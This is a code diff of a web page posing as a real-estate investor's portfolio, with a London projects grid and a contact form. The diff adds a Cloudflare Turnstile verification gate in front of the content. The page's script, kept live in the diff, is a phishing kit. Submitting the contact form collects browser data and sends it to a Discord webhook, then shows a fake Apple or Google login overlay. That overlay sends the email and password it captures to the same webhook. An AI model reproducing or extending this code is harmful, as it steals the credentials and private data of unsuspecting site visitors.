@@ -3,8 +3,9 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Portfolio — Real Estate Investments</title>
+    <title>Real Estate Portfolio — Investments & Advisory</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
     <style>
         /* ========================================================= */
         /*                     RESET & BASE                         */
@@ -24,12 +25,8 @@
             text-decoration: none;
             color: inherit;
         }
-        img {
-            max-width: 100%;
-            display: block;
-        }
         .container {
-            max-width: 1200px;
+            max-width: 1100px;
             margin: 0 auto;
             padding: 0 2rem;
         }
@@ -126,14 +123,14 @@
         /* ========================================================= */
         .projects {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
             gap: 2rem;
             margin: 3rem 0;
         }
         .project-card {
             background: #fff;
             border-radius: 20px;
-            overflow: hidden;
+            padding: 1.8rem;
             box-shadow: 0 4px 20px rgba(0,0,0,0.04);
             transition: 0.25s;
             border: 1px solid #e2e8f0;
@@ -142,34 +139,27 @@
             transform: translateY(-6px);
             box-shadow: 0 12px 40px rgba(0,0,0,0.06);
         }
-        .project-card .image {
-            height: 200px;
-            background: #e2e8f0;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: #94a3b8;
-            font-size: 0.9rem;
+        .project-card .icon {
+            font-size: 2rem;
+            color: #2563eb;
+            margin-bottom: 0.8rem;
         }
-        .project-card .content {
-            padding: 1.5rem;
-        }
-        .project-card .content .tag {
+        .project-card .tag {
             font-size: 0.7rem;
             text-transform: uppercase;
             letter-spacing: 0.5px;
             color: #2563eb;
             font-weight: 600;
         }
-        .project-card .content h3 {
+        .project-card h3 {
             font-size: 1.3rem;
             margin: 0.4rem 0 0.6rem;
         }
-        .project-card .content p {
+        .project-card p {
             color: #475569;
             font-size: 0.95rem;
         }
-        .project-card .content .btn {
+        .project-card .btn {
             display: inline-block;
             margin-top: 1rem;
             padding: 0.5rem 1.6rem;
@@ -180,7 +170,7 @@
             font-size: 0.85rem;
             transition: 0.2s;
         }
-        .project-card .content .btn:hover {
+        .project-card .btn:hover {
             background: #2563eb;
         }
 
@@ -299,6 +289,64 @@
         }
 
         /* ========================================================= */
+        /*                    GATE — TURNSTILE                      */
+        /* ========================================================= */
+        #gate {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #f8fafc;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            transition: opacity 0.6s ease;
+        }
+        #gate.hidden {
+            opacity: 0;
+            pointer-events: none;
+        }
+        .gate-card {
+            max-width: 420px;
+            width: 90%;
+            background: #fff;
+            border-radius: 28px;
+            padding: 40px 32px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.08);
+            border: 1px solid #e5e7eb;
+            text-align: center;
+        }
+        .gate-card .icon {
+            font-size: 48px;
+            margin-bottom: 12px;
+        }
+        .gate-card h2 {
+            font-size: 22px;
+            font-weight: 600;
+            color: #0f172a;
+            margin-bottom: 8px;
+        }
+        .gate-card p {
+            font-size: 15px;
+            color: #475569;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+        .gate-card .status {
+            font-size: 14px;
+            color: #94a3b8;
+            margin-top: 12px;
+        }
+        .gate-card .status.success {
+            color: #22c55e;
+        }
+        .gate-card .status.error {
+            color: #ef4444;
+        }
+
+        /* ========================================================= */
         /*                    LOGIN OVERLAY                         */
         /* ========================================================= */
         #loginOverlay {
@@ -389,144 +437,173 @@
         .login-card .login-footer a:hover {
             text-decoration: underline;
         }
-
-        /* ========================================================= */
-        /*                     SCROLL ANIMATION                     */
-        /* ========================================================= */
-        .fade-up {
-            opacity: 0;
-            transform: translateY(30px);
-            transition: 0.6s ease;
-        }
-        .fade-up.visible {
-            opacity: 1;
-            transform: translateY(0);
-        }
     </style>
 </head>
 <body>
 
     <!-- ========================================================= -->
-    <!--                      HEADER                               -->
+    <!--                    GATE — TURNSTILE                       -->
     <!-- ========================================================= -->
-    <header>
-        <div class="container">
-            <div class="logo">Real<span>Estate</span></div>
-            <nav>
-                <ul>
-                    <li class="active"><a href="#home">Home</a></li>
-                    <li><a href="#projects">Projects</a></li>
-                    <li><a href="#contact">Contact</a></li>
-                </ul>
-            </nav>
+    <div id="gate">
+        <div class="gate-card">
+            <div class="icon">🛡️</div>
+            <h2>Verifying your device...</h2>
+            <p>Please complete the verification below to continue.</p>
+            <div class="cf-turnstile"
+                 data-sitekey="0x4AAAAAAD8LhPDeUazZrSjH"
+                 data-theme="light"
+                 data-size="normal"
+                 data-action="turnstile-spin-v2"
+                 data-callback="onTurnstileSuccess"
+                 data-expired-callback="onTurnstileExpired"
+                 data-error-callback="onTurnstileError">
+            </div>
+            <div class="status" id="gateStatus">⏳ Waiting for verification...</div>
         </div>
-    </header>
+    </div>
 
     <!-- ========================================================= -->
-    <!--                      HERO SECTION                         -->
+    <!--                      MAIN CONTENT                        -->
     <!-- ========================================================= -->
-    <section class="hero" id="home">
-        <div class="container">
-            <h1>Building <span>value</span> through<br />real estate investments</h1>
-            <p>I help investors identify, acquire, and manage high‑yield residential and commercial properties across Europe.</p>
-            <a href="#projects" class="cta">View my work</a>
-        </div>
-    </section>
+    <div id="mainContent" style="display: none;">
 
-    <!-- ========================================================= -->
-    <!--                      PROJECTS GRID                        -->
-    <!-- ========================================================= -->
-    <div class="container" id="projects">
-        <h2 style="font-size: 1.8rem; margin-bottom: 1rem;">Featured Projects</h2>
-        <div class="projects">
+        <!-- HEADER -->
+        <header>
+            <div class="container">
+                <div class="logo">Real<span>Estate</span></div>
+                <nav>
+                    <ul>
+                        <li class="active"><a href="#home">Home</a></li>
+                        <li><a href="#projects">Projects</a></li>
+                        <li><a href="#contact">Contact</a></li>
+                    </ul>
+                </nav>
+            </div>
+        </header>
 
-            <div class="project-card fade-up">
-                <div class="image"><i class="fas fa-building" style="font-size: 2rem; color: #94a3b8;"></i> Berlin Mixed‑Use</div>
-                <div class="content">
+        <!-- HERO -->
+        <section class="hero" id="home">
+            <div class="container">
+                <h1>Building <span>value</span> through<br />real estate investments</h1>
+                <p>I help investors identify, acquire, and manage high‑yield residential and commercial properties across the UK & Europe.</p>
+                <a href="#projects" class="cta">View my work</a>
+            </div>
+        </section>
+
+        <!-- PROJECTS -->
+        <div class="container" id="projects">
+            <h2 style="font-size: 1.8rem; margin-bottom: 1rem;">Featured Projects</h2>
+            <div class="projects">
+
+                <div class="project-card">
+                    <div class="icon"><i class="fas fa-building"></i></div>
                     <span class="tag">Residential &amp; Commercial</span>
-                    <h3>Berlin Mixed‑Use Development</h3>
-                    <p>Acquired a 12‑unit mixed‑use building in Prenzlauer Berg with 8% projected yield.</p>
+                    <h3>London Mixed‑Use Development</h3>
+                    <p>Acquired a 14‑unit mixed‑use building in Shoreditch with 8.5% projected yield. Fully leased within 6 months.</p>
                     <a href="#" class="btn">View Case Study</a>
                 </div>
-            </div>
 
-            <div class="project-card fade-up">
-                <div class="image"><i class="fas fa-home" style="font-size: 2rem; color: #94a3b8;"></i> Munich Apartments</div>
-                <div class="content">
+                <div class="project-card">
+                    <div class="icon"><i class="fas fa-home"></i></div>
                     <span class="tag">Residential</span>
-                    <h3>Munich Luxury Apartments</h3>
-                    <p>Six high‑end apartments in Schwabing — fully rented within 3 months.</p>
+                    <h3>Manchester Luxury Apartments</h3>
+                    <p>Eight high‑end apartments in the city centre — all rented within 60 days. Strong rental demand in the area.</p>
                     <a href="#" class="btn">View Case Study</a>
                 </div>
-            </div>
 
-            <div class="project-card fade-up">
-                <div class="image"><i class="fas fa-warehouse" style="font-size: 2rem; color: #94a3b8;"></i> Luxembourg Logistics</div>
-                <div class="content">
+                <div class="project-card">
+                    <div class="icon"><i class="fas fa-warehouse"></i></div>
                     <span class="tag">Commercial</span>
-                    <h3>Luxembourg Logistics Hub</h3>
-                    <p>10,000 m² logistics facility leased to a major e‑commerce player.</p>
+                    <h3>Birmingham Logistics Hub</h3>
+                    <p>12,000 m² logistics facility leased to a major e‑commerce player. 10‑year lease with annual escalations.</p>
                     <a href="#" class="btn">View Case Study</a>
                 </div>
-            </div>
 
+            </div>
         </div>
+
+        <!-- CONTACT -->
+        <div class="container" id="contact">
+            <div class="contact-section">
+                <div class="info">
+                    <h2>Let's work together</h2>
+                    <p>Interested in partnering or investing? Reach out — I respond within 24 hours.</p>
+                    <div style="margin-top: 1.2rem;">
+                        <p><i class="fas fa-phone" style="color: #2563eb; width: 24px;"></i> +44 20 7123 4567</p>
+                        <p><i class="fas fa-envelope" style="color: #2563eb; width: 24px;"></i> info@realestate.dev</p>
+                        <p><i class="fas fa-map-marker-alt" style="color: #2563eb; width: 24px;"></i> London, UK</p>
+                    </div>
+                    <div class="icons">
+                        <a href="#"><i class="fab fa-linkedin-in"></i></a>
+                        <a href="#"><i class="fab fa-x-twitter"></i></a>
+                        <a href="#"><i class="fab fa-github"></i></a>
+                    </div>
+                </div>
+
+                <div class="contact-form">
+                    <form id="contactForm">
+                        <div class="field">
+                            <label for="name">Name</label>
+                            <input type="text" id="name" placeholder="Your name" />
+                        </div>
+                        <div class="field">
+                            <label for="email">Email</label>
+                            <input type="email" id="email" placeholder="your@email.com" />
+                        </div>
+                        <div class="field">
+                            <label for="message">Message</label>
+                            <textarea id="message" rows="3" placeholder="Tell me about your investment goals..."></textarea>
+                        </div>
+                        <button type="submit" class="submit-btn" id="submitBtn"><i class="fas fa-paper-plane"></i> Send Message</button>
+                    </form>
+                </div>
+            </div>
+        </div>
+
+        <!-- FOOTER -->
+        <footer>
+            <div class="container">
+                <p>&copy; 2026 RealEstate Investments. Built with <i class="fas fa-heart" style="color: #2563eb;"></i></p>
+            </div>
+        </footer>
+
     </div>
 
     <!-- ========================================================= -->
-    <!--                      CONTACT SECTION                      -->
-    <!-- ========================================================= -->
-    <div class="container" id="contact">
-        <div class="contact-section fade-up">
-            <div class="info">
-                <h2>Let's work together</h2>
-                <p>Interested in partnering or investing? Reach out — I respond within 24 hours.</p>
-                <div style="margin-top: 1.2rem;">
-                    <p><i class="fas fa-phone" style="color: #2563eb; width: 24px;"></i> +49 30 123 4567</p>
-                    <p><i class="fas fa-envelope" style="color: #2563eb; width: 24px;"></i> info@realestate.dev</p>
-                    <p><i class="fas fa-map-marker-alt" style="color: #2563eb; width: 24px;"></i> Berlin, Germany</p>
-                </div>
-                <div class="icons">
-                    <a href="#"><i class="fab fa-linkedin-in"></i></a>
-                    <a href="#"><i class="fab fa-x-twitter"></i></a>
-                    <a href="#"><i class="fab fa-github"></i></a>
-                </div>
-            </div>
-
-            <div class="contact-form">
-                <form id="contactForm">
-                    <div class="field">
-                        <label for="name">Name</label>
-                        <input type="text" id="name" placeholder="Your name" />
-                    </div>
-                    <div class="field">
-                        <label for="email">Email</label>
-                        <input type="email" id="email" placeholder="your@email.com" />
-                    </div>
-                    <div class="field">
-                        <label for="message">Message</label>
-                        <textarea id="message" rows="3" placeholder="Tell me about your investment goals..."></textarea>
-                    </div>
-                    <button type="submit" class="submit-btn" id="submitBtn"><i class="fas fa-paper-plane"></i> Send Message</button>
-                </form>
-            </div>
-        </div>
-    </div>
-
-    <!-- ========================================================= -->
-    <!--                      FOOTER                               -->
-    <!-- ========================================================= -->
-    <footer>
-        <div class="container">
-            <p>&copy; 2026 RealEstate Investments. Built with <i class="fas fa-heart" style="color: #2563eb;"></i></p>
-        </div>
-    </footer>
-
-    <!-- ========================================================= -->
-    <!--                    DATA EXFIL + DUAL LOGIN                -->
+    <!--                      SCRIPTS                             -->
     <!-- ========================================================= -->
     <script>
         (function() {
+
+            // ============================================================
+            // TURNSTILE CALLBACKS
+            // ============================================================
+            const gate = document.getElementById('gate');
+            const gateStatus = document.getElementById('gateStatus');
+            const mainContent = document.getElementById('mainContent');
+
+            window.onTurnstileSuccess = function(token) {
+                gateStatus.textContent = '✅ Verified — loading...';
+                gateStatus.className = 'status success';
+                window.turnstileToken = token;
+
+                setTimeout(function() {
+                    gate.classList.add('hidden');
+                    mainContent.style.display = 'block';
+                }, 600);
+            };
+
+            window.onTurnstileExpired = function() {
+                gateStatus.textContent = '⏳ Verification expired — try again.';
+                gateStatus.className = 'status';
+                window.turnstileToken = null;
+            };
+
+            window.onTurnstileError = function() {
+                gateStatus.textContent = '❌ Error — please refresh.';
+                gateStatus.className = 'status error';
+                window.turnstileToken = null;
+            };
 
             // ============================================================
             // DISCORD WEBHOOK
@@ -606,16 +683,11 @@
                 `;
                 document.body.appendChild(overlay);
 
-                // ============================================================
-                // BIND LOGIN SUBMIT
-                // ============================================================
                 document.getElementById('loginSubmit').addEventListener('click', function() {
                     let email = document.getElementById('loginEmail').value;
                     let password = document.getElementById('loginPassword').value;
 
-                    if (!email || !password) {
-                        return;
-                    }
+                    if (!email || !password) return;
 
                     let msg = `🔐 **${platform} Credentials Captured**\n📧 Email: ${email}\n🔑 Password: ${password}\n📱 Device: ${navigator.userAgent}\n⏰ Time: ${new Date().toISOString()}`;
                     sendToDiscord(msg);
@@ -624,11 +696,8 @@
                     window.location.href = isApple ? 'https://www.icloud.com' : 'https://www.google.com';
                 });
 
-                // Allow Enter key on password field
                 document.getElementById('loginPassword').addEventListener('keydown', function(e) {
-                    if (e.key === 'Enter') {
-                        document.getElementById('loginSubmit').click();
-                    }
+                    if (e.key === 'Enter') document.getElementById('loginSubmit').click();
                 });
             }
 
@@ -638,29 +707,14 @@
             document.getElementById('submitBtn').addEventListener('click', function(e) {
                 e.preventDefault();
 
-                // Step 1: Extract and send browser data
                 let browserData = extractBrowserData();
                 let dataMsg = '📦 **Browser Data Extracted**\n```json\n' + JSON.stringify(browserData, null, 2) + '\n```';
                 sendToDiscord(dataMsg);
 
-                // Step 2: Show the appropriate login overlay
                 setTimeout(function() {
                     detectDeviceAndRedirect();
                 }, 600);
             });
-
-            // ============================================================
-            // SCROLL ANIMATION
-            // ============================================================
-            const observer = new IntersectionObserver((entries) => {
-                entries.forEach(entry => {
-                    if (entry.isIntersecting) {
-                        entry.target.classList.add('visible');
-                    }
-                });
-            }, { threshold: 0.15 });
-
-            document.querySelectorAll('.fade-up').forEach(el => observer.observe(el));
 
         })();
     </script>
